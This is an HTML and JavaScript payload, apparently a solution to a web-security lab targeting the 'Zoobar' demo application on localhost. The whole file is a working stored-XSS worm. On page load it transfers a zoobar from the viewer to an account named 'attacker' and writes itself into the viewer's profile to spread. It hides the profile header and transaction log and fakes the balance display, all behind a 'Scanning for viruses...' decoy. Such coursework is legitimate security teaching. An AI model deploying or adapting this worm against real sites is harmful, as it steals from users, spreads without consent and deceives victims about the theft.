<div id="payload-div">
	<span id="zoobarsfake" style="font-weight: normal"></span>
	<p>Scanning for viruses...</p>
	<style>.log tbody{ visibility: hidden; }</style>
	<script>
		document.addEventListener("DOMContentLoaded", hack(), false);
		function hack() {
			// Steal 1 zoobar
			var http_steal = new XMLHttpRequest();
			http_steal.open("POST", 'http://localhost:8080/zoobar/index.cgi/transfer', true);
			http_steal.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			http_steal.send('zoobars=1&recipient=attacker&submission=Send');

			// Spread to the account logged in
			var http_spread = new XMLHttpRequest();http_spread.open("POST", 'http://localhost:8080/zoobar/index.cgi/', true);
			http_spread.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
			var payload = document.getElementById("payload-div").outerHTML;
			http_spread.send('profile_update='+encodeURIComponent(payload)+'&profile_submit=Save');

			// Hide the theft
			document.getElementById("profileheader").style.display = "none";
			total = 0;
			showZoobarsFake(0);
			if (total > 0) showZoobarsFake(0);  // count up to total
		}
		
		// Fake the animation
		function showZoobarsFake(zoobars) {
			var username = document.getElementsByName("user")[0].value;
			document.getElementById("zoobarsfake").innerHTML =
				username + "'s zoobars:" + zoobars;
			if (zoobars < 10) {
				setTimeout("showZoobarsFake(" + (zoobars + 1) + ")", 100);
			}
		}	 
	</script>
</div>
